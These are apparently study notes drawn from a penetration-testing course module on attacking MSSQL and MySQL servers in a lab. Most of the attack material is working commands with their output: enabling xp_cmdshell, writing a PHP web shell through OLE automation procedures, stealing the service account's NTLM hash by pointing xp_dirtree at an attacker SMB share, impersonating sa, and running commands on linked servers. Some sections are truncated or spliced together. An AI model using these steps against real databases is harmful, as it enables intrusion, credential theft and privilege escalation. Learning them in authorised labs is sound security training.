[MySQL](https://www.mysql.com/) and [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [relational database](https://en.wikipedia.org/wiki/Relational_database) management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.

Databases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, `Personal Identifiable Information (PII)`, business-related data, and payment information. In addition, those services often are configured with highly privileged users. If we gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.

## Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:

## Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are|
#### Sqlcmd - Connecting to the SQL Server

  Attacking SQL Databases

```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:

  Attacking SQL Databases

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp

```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

  Attacking SQL Databases

```bash
mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

```

**Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.
If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

  Attacking SQL Databases

```bash
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```
  Attacking SQL Databases

```bash
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

# Useful Commands:
```sql
SELECT name FROM master.dbo.sysdatabases
go
```
```sql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
go
```
```sql
SELECT * FROM users
go
```

## Execute Commands

`Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:

#### XP_CMDSHELL

  Attacking SQL Databases

```sql
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:


```sql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

## Write Local Files

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.


To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures

  Attacking SQL Databases

```sql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File

  Attacking SQL Databases

```sql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---

## Read Local Files

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

#### Read Local Files in MSSQL

  Attacking SQL Databases

```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

## Capture MSSQL Service Hash

In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:
Never forget about the fact that we can save the mssqvc service hash by:
#### XP_DIRTREE Hash Stealing

  Attacking SQL Databases

```sql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### XP_SUBDIRS Hash Stealing

  Attacking SQL Databases

```sql
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

## Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

#### Identify Users that We Can Impersonate

  Attacking SQL Databases

```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

#### Verifying our Current User and Role

  Attacking SQL Databases

```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

#### Impersonating the SA User

  Attacking SQL Databases

```sql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

---

## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### Identify linked Servers in MSSQL

  Attacking SQL Databases

```sql
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

  Attacking SQL Databases

```sql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

Once inside via RDP, the SQL Server attack begins:
```sql
-- First, connect to the local SQL Server using sqlcmd
sqlcmd -S localhost
-- Following the module's instructions on impersonation
-- This lets you execute commands as a more privileged
user EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER
```
The linked server part is particularly interesting. When a SQL Server has a linked server configured, you can execute commands on that remote server using the AT clause. The syntax looks like:
```sql
EXECUTE('your-command-here') AT [LINKED.SERVER.NAME]
```
For command execution, you need to:

1. Enable xp_cmdshell on the linked server:

```sql
EXECUTE('sp_configure "show advanced options", 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV] EXECUTE('sp_configure "xp_cmdshell", 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```

2. Then you can run system commands. The example shows reading the flag:

```sql
EXECUTE('xp_cmdshell ''more C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
```
The nested quotes are important here - single quotes inside double quotes allow the command to be properly interpreted across the linked server connection.

This attack is effective because:

1. It bypasses network restrictions by using the trusted link between SQL Servers
2. It leverages the permissions of the linked server's service account
3. It allows remote command execution through a series of legitimate features
